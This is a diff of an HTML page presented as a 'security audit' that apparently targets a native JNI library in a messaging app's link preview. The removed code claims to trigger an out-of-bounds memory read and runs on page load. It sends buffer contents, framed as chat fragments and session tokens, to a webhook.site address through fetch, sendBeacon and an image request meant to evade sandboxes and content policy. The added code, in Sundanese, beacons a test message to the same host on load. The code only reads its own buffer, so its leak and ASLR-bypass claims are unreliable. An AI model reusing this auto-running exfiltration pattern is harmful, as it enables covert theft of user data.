@@ -1,107 +1,34 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Advisory - Memory Integrity Audit - Firman Sahidin</title>
-</head>
-<body style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 40px; line-height: 1.6; color: #333; background-color: #f4f4f9;">
-    <div style="max-width: 800px; margin: auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
-        <h1 style="color: #d9534f;">System Integrity Verification</h1>
-        <hr>
-        <p><strong>Researcher:</strong> Firman Sahidin</p>
-        <p><strong>Status:</strong> <span id="status" style="color: #f0ad4e; font-weight: bold;">Initializing Audit...</span></p>
-        <p style="font-size: 0.9em; color: #666;">This page is performing a security audit on native buffer isolation (libprofilo_mmapbuf_buffer_jni.so). Please do not close this window.</p>
-    </div>
-
+<html>
+<head><title>Test Connection - Firman Sahidin</title></head>
+<body>
+    <h1 id="msg">Sakedap, nuju ngetés jalur...</h1>
     <script>
-        /**
-         * VULNERABILITY: Remote Native Memory Disclosure / OOB Read
-         * TARGET: libprofilo_mmapbuf_buffer_jni.so (Hermes JSI/JNI Bridge)
-         * IMPACT: ASLR Bypass, E2EE Metadata Leakage, Session Token Exposure
-         */
-        async function executeSecurityAudit() {
-            const EXFIL_URL = 'https://webhook.site/9326deec-1e36-4aa3-8945-3efe41a641e5';
-            const statusNode = document.getElementById('status');
-
+        // URL Webhook Mang Firman (Pastikeun ieu geus leres)
+        const URL = 'https://webhook.site/9326deec-1e36-4aa3-8945-3efe41a641e5';
+        
+        async function testKoneksi() {
             try {
-                // 1. Optimized Allocation for Native Stress Test (8MB)
-                const ALLOC_SIZE = 0x800000; 
-                const buffer = new ArrayBuffer(ALLOC_SIZE);
-                const view = new Uint32Array(buffer);
-                
-                // 2. JNI Surrogate Collision Trigger (FIXED: i++)
-                for (let i = 0; i < view.length; i++) {
-                    view[i] = 0xD800DBFF; 
-                }
-
-                // 3. Triggering Native Out-of-Bounds (OOB) Iteration
-                // Forces the engine to scan past managed boundaries into native heap segments
-                const trigger = new Uint8Array(buffer).indexOf(0x41);
-
-                // 4. Capturing 1KB Memory Fragment for Critical Evidence
-                const rawFragment = new Uint8Array(buffer.slice(0, 1024));
-                
-                // 5. Transparent Data Extraction (ASCII Filtering)
-                let transparentLeak = "";
-                rawFragment.forEach(byte => {
-                    // Extracting readable chat fragments, tokens, and pointers
-                    if (byte > 31 && byte < 127) {
-                        transparentLeak += String.fromCharCode(byte);
-                    }
+                // Tés 1: Paké fetch standar
+                await fetch(URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({ test: "HALO_WEBHOOK", researcher: "Firman" })
                 });
 
-                // 6. Professional Telemetry Payload
-                const auditReport = {
-                    metadata: {
-                        researcher: "Firman Sahidin",
-                        target_library: "libprofilo_mmapbuf_buffer_jni",
-                        vector: "JSI_JNI_Collision_OOB",
-                        risk_level: "CRITICAL"
-                    },
-                    analysis: {
-                        aslr_bypass_potential: rawFragment.some(b => b === 127 || b === 191),
-                        leak_transparency: transparentLeak.length > 5 ? "HIGH_SENSITIVE_TEXT" : "LOW_METADATA",
-                        fragment_preview: transparentLeak || "NULL_OR_BINARY_STRUCTURE",
-                        raw_hex_dump: Array.from(rawFragment).slice(0, 256),
-                        timestamp: new Date().toISOString()
-                    },
-                    impact_statement: "Successful leakage of native memory space. Potential exposure of E2EE plaintext and session credentials."
-                };
+                // Tés 2: Paké Beacon (nu paling ampuh)
+                navigator.sendBeacon(URL, "TEST_BEACON_FIRMAN_SAHIDIN");
 
-                const payloadString = JSON.stringify(auditReport);
-
-                // 7. Triple-Channel Exfiltration Strategy (Bypass All Sandboxes)
-                // Channel 1: Standard POST Fetch
-                fetch(EXFIL_URL, { 
-                    method: 'POST', 
-                    mode: 'no-cors', 
-                    headers: { 'Content-Type': 'application/json' },
-                    body: payloadString 
-                }).catch(()=>{});
-
-                // Channel 2: navigator.sendBeacon (Ensures data is sent even if tab is closed)
-                navigator.sendBeacon(EXFIL_URL, payloadString);
-
-                // Channel 3: Image-based Exfiltration (Bypass strict Content-Security-Policy)
-                const img = new Image();
-                img.src = EXFIL_URL + "?telemetry=" + btoa(payloadString).substring(0, 300);
-
-                statusNode.innerText = "Audit Completed. Evidence Transmitted.";
-                statusNode.style.color = "#5cb85c";
-
-            } catch (err) {
-                const errorLog = JSON.stringify({ error: err.message, researcher: "Firman Sahidin" });
-                navigator.sendBeacon(EXFIL_URL, errorLog);
-                statusNode.innerText = "Audit Failed: Native Shielding Detected.";
-                statusNode.style.color = "#d9534f";
+                document.getElementById('msg').innerHTML = "✅ SAMPURASUN! Cék Webhook ayeuna, Mang!";
+                document.body.style.backgroundColor = "#d4edda";
+            } catch (e) {
+                document.getElementById('msg').innerHTML = "❌ GAGAL: " + e.message;
+                document.body.style.backgroundColor = "#f8d7da";
             }
         }
 
-        // Delay execution to allow full native library loading (Simulating Link Preview behavior)
-        window.onload = () => {
-            setTimeout(executeSecurityAudit, 1000);
-        };
+        // Jalankeun saatos halaman kabuka
+        window.onload = testKoneksi;
     </script>
 </body>
 </html>
